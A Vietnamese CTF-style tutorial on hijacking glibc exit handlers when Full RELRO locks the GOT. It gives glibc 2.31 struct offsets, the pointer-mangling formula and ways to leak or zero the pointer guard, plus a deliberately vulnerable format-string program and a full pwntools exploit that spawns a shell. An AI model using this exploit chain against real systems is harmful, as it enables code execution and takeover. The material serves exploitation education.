Exit Handlers

Khi chương trình exit() (hay return khỏi main), glibc chạy danh sách "hàm dọn dẹp" — con trỏ hàm trong vùng dữ liệu ghi được của libc. Ghi đè một con trỏ đó → chuyển hướng luồng lúc thoát. Đích lý tưởng khi GOT đã khóa (Full RELRO). Bài này đi struct số thật glibc 2.31 + công thức mangle tính cụ thể.

Bài này nói về cái gì?

Cơ chế: exit() gọi __run_exit_handlers, duyệt danh sách __exit_funcs và gọi từng con trỏ hàm (hàm atexit, destructor). Danh sách nằm trong vùng data ghi được của libc (biến initial) — không bị Full RELRO khóa.

Khai thác: ghi đè con trỏ hàm trong danh sách = redirect luồng khi thoát. Vì exit/return-from-main gần như luôn chạy, đích rất tin cậy.

Rào: con trỏ bị mã hóa (PTR_MANGLE): stored = rol(target ⊕ guard, 0x11), guard = fs:0x30 (pointer_guard, ngẫu nhiên mỗi tiến trình). Cần leak guard (hoặc ghi guard=0) để forge.

Nếu chỉ nhớ một điều: Full RELRO khóa GOT → ghi con trỏ exit handler thay; nhớ nó bị mangle (cần guard fs:0x30).

⚡ COMBAT CARD — đọc khi đang thi, bắt tay giải liền
🚩 Khi nào dùng

Có write-tùy-ý (fmt/OOB/heap) + leak libc · Full RELRO (GOT read-only) · chương trình sẽ exit()/return. → ghi exit handler.

🔢 Offset thật 2.31 
initial         = libc + 0x1ed660   # exit_function_list đầu
__exit_funcs    = libc + 0x1ed658   # con trỏ tới initial
fns[0].fn       = initial + 0x18    # = libc+0x1ed678 (mangled)
pointer_guard   = fs:0x30           # leak hoặc ghi 0
✅ Hai hướng

(a) Biết guard: forge stored = rol(target ⊕ guard, 0x11), ghi vào fns[0].fn. (b) Zero guard: ghi fs:0x30 = 0 trước → stored = rol(target, 0x11), khỏi leak guard.

⚡ Skeleton 
guard = leak_fs_0x30
def mangle(t):
    v = t ^ guard
    return ((v<<0x11)|(v>>(64-0x11))) & (2**64-1)
write(libc.address+0x1ed678, p64(mangle(win)))   # fns[0].fn
# đảm bảo fns[0].flavor = 4 (ef_cxa), idx ≥ 1
⚠️ Kẹt thì xem

Quên mangle → nhảy rác · flavor ≠ 4 → không gọi · idx=0 → không duyệt · guard sai → mangle sai. Offset khác version → disassemble __run_exit_handlers.

01 / NỀN TẢNG BẮT BUỘC

Điều gì chạy khi exit()

atexit & __run_exit_handlers

C cho phép đăng ký "hàm dọn dẹp" chạy khi thoát: atexit(f), destructor thư viện, __cxa_atexit… glibc lưu chúng vào danh sách liên kết __exit_funcs (mỗi node là exit_function_list chứa mảng exit_function). Khi exit() chạy, __run_exit_handlers duyệt danh sách và gọi từng con trỏ hàm. Return khỏi main cũng dẫn tới đây (qua __libc_start_main).

Định nghĩa nhanh

__exit_funcs

Con trỏ tới danh sách hàm exit; mặc định trỏ initial (trong libc bss).

initial

exit_function_list tĩnh trong libc; node đầu của danh sách.

flavor

Loại entry: 4 = ef_cxa (gọi fn(arg)), 3 = ef_on, 0 = ef_free (bỏ qua).

PTR_MANGLE

Mã hóa con trỏ: rol(ptr ⊕ guard, 0x11).

pointer_guard

Khóa ngẫu nhiên tại fs:0x30 (TLS).

Full RELRO

Khóa GOT binary (KHÔNG khóa data libc → exit handler ghi được).

Pointer mangling — rào chắn

glibc không lưu con trỏ hàm exit "trần" mà mã hóa để chống chính kiểu tấn công này:

stored    = rol( target ⊕ guard , 0x11 )   ; khi ĐĂNG KÝ (PTR_MANGLE)
gọi(x)    : target = ror(stored, 0x11) ⊕ guard  ; khi CHẠY (PTR_DEMANGLE)
VersionOffset struct & chi tiết mangling thay đổi theo glibc. Luôn kiểm disassemble __run_exit_handlers và cấu trúc initial/__exit_funcs trong gdb cho đúng bản. Bài dùng glibc 2.31 làm mẫu số thật.
02 / VÌ SAO CÓ KỸ THUẬT

Khi GOT bị khóa

Format string / OOB / heap cho bạn "ghi giá trị vào địa chỉ". Đích quen thuộc là GOT (ghi = system). Nhưng Full RELRO làm GOT read-only → ghi GOT crash. Lúc đó bạn cần một con trỏ hàm khác, ghi được, chắc chắn được gọi.

Exit handler đúng là vậy: con trỏ hàm trong data libc (ghi được), gọi khi thoát. Cùng với FSOP (con trỏ trong struct FILE), đây là hai đích "post-GOT" chính của CTF hiện đại. Khác biệt: exit handler bị mangle (cần guard), FSOP không.

03 / STRUCT · MỤC LÕI

Danh sách exit, từng byte (số thật 2.31)

Bảng-byte: initial (struct exit_function_list) @ libc+0x1ed660

+0x00next = con trỏ node kế (NULL nếu chỉ 1 node)
+0x08idx = số entry trong node (phải ≥ 1 để fns[0] được duyệt)
+0x10fns[0].flavor = 4 (ef_cxa) → glibc gọi fn(arg, dso)
+0x18fns[0].fn = con trỏ MANGLED ← đích ghi (= libc+0x1ed678)
+0x20fns[0].arg = tham số truyền cho fn (rdi khi gọi)
+0x28fns[0].dso_handle
Mẹo argVì flavor=4 gọi fn(arg), nếu đặt target = system và fns[0].arg = &"/bin/sh" → system("/bin/sh") trực tiếp (giống free_hook trick). Ghi cả fn (mangled system) lẫn arg.

Công thức forge (số thật)

# target = system = libc+0x52290 ; guard = fs:0x30 (leak)
stored = rol( (system ⊕ guard) , 0x11 )
# ghi stored vào libc+0x1ed678 ; ghi &"/bin/sh" vào libc+0x1ed680 (arg)
# nếu zero-guard: stored = rol(system, 0x11)
04 / POINTER GUARD

Lấy guard: leak hay zero

1

Leak guard (fs:0x30)

pwndbg> p/x *(unsigned long*)($fs_base+0x30)   # pointer_guard
# khai thác: leak qua cùng primitive (fmt %p nếu guard lọt stack, hay arbitrary read TLS)
2

Hoặc ghi guard = 0

# nếu có write-tùy-ý: ghi 0 vào fs:0x30 (địa chỉ TLS, thường gần stack)
# → mangling thành rol(target,0x11) — khỏi leak guard
Hai bẫy① guard nằm trong TLS (fs:0x30) — địa chỉ tuyệt đối khó đoán nếu không leak stack/TLS. ② Zero-guard cần ghi được đúng ô TLS đó. Thường leak guard dễ hơn nếu có fmt/arbitrary-read.
05 / TỰ TAY THỬ

Máy tính mangle con trỏ

Nhập target (đích muốn nhảy) và guard để ra giá trị cần ghi vào fns[0].fn. Bật "guard = 0" để thấy trường hợp zero-guard.

stored = rol(target ⊕ guard, 0x11). Ghi "stored" vào fns[0].fn (libc+0x1ed678) → khi exit, demangle ra đúng target.

07 / EXPLOIT ĐẦY ĐỦ

Full RELRO + fmt write → exit handler → shell (glibc 2.31)

// vuln.c — gcc vuln.c -o vuln -z relro -z now  (Full RELRO → GOT khóa)
int main(){ char buf[0x100];
  for(int i=0;i<3;i++){ fgets(buf,0x100,stdin); printf(buf); }  // fmt, 3 lần
  return 0;   // ← return → chạy exit handlers
}
# BẢN A — leak libc + guard, forge mangle(system), ghi fns[0].fn + arg bằng fmt.
from pwn import *
exe  = ELF("./vuln", checksec=False)
libc = ELF("./libc.so.6", checksec=False)
p = process(exe.path)
rol = lambda v,n:((v<<n)|(v>>(64-n)))&(2**64-1)

# vòng 1: leak libc (ô %21$p) và guard (ô chứa fs:0x30 trên stack, dò bằng %N$p)
p.sendline(b"%21$p|%POS_GUARD$p")
a,b = p.recvline().split(b"|")
libc.address = int(a,16) - 0x24083        # __libc_start_main+243
guard        = int(b,16)
log.success(f"libc={hex(libc.address)} guard={hex(guard)}")

fn_addr  = libc.address + 0x1ed678          # fns[0].fn
arg_addr = libc.address + 0x1ed680          # fns[0].arg
system   = libc.sym.system
binsh    = next(libc.search(b"/bin/sh"))
stored   = rol(system ^ guard, 0x11)

# vòng 2: ghi fns[0].fn = mangle(system) ; fns[0].arg = &"/bin/sh"
p.sendline(fmtstr_payload(6, {fn_addr: stored, arg_addr: binsh}))

# vòng 3 / return → __run_exit_handlers → system("/bin/sh")
p.sendline(b"id")
p.interactive()

sl(b"%21$p|%POS_GUARD$p"); a,b = rl().split(b"|")

stored = rol(LIBC.sym.system ^ guard, 0x11)

09 / GỠ LỖI

Khi exit không nhảy đúng

Quên mangle

Ghi target trần → demangle ra rác → crash. Phải ghi rol(target^guard,0x11).

Guard sai

Leak nhầm ô. fs:0x30 khác canary (fs:0x28). Xác nhận bằng gdb.

flavor/idx sai

flavor phải 4 (ef_cxa), idx≥1. Nếu không, entry không được gọi.

Offset struct sai version

Vị trí fns[0].fn khác theo glibc. Đọc struct thực tế trong gdb.

Chương trình không exit

Luồng không tới exit/return → handler không chạy. Ép thoát (EOF…).

Zero-guard không được

Không ghi được fs:0x30 (TLS) → bắt buộc leak guard.
